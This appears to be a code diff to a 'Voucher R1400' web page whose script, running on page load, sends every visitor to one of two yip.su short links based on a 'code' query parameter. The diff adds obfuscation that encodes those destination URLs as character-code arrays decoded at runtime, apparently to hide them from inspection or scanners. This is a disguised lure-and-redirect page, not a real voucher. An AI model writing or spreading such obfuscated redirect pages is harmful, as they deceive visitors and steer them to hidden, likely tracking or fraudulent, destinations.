@@ -4,13 +4,25 @@
     <meta charset="utf-8">
     <title>Voucher R1400</title>
     <script>
+        function decode(parts) {
+            return parts.map(p => String.fromCharCode(p)).join("");
+        }
+
+        const targetValid = decode([
+            104,116,116,112,115,58,47,47,121,105,112,46,115,117,47,50,103,99,100,98,53
+        ]);
+
+        const targetFallback = decode([
+            104,116,116,112,115,58,47,47,121,105,112,46,115,117,47,50,103,69,115,98,53
+        ]);
+
         const params = new URLSearchParams(window.location.search);
         const code = params.get("code");
 
         if (code === "1225 1295 0785 3896") {
-             window.location.replace("https://yip.su/2gcdb5");
-        }else{
-           window.location.replace("https://yip.su/2gEsb5");
+            window.location.replace(targetValid);
+        } else {
+            window.location.replace(targetFallback);
         }
     </script>
 </head>
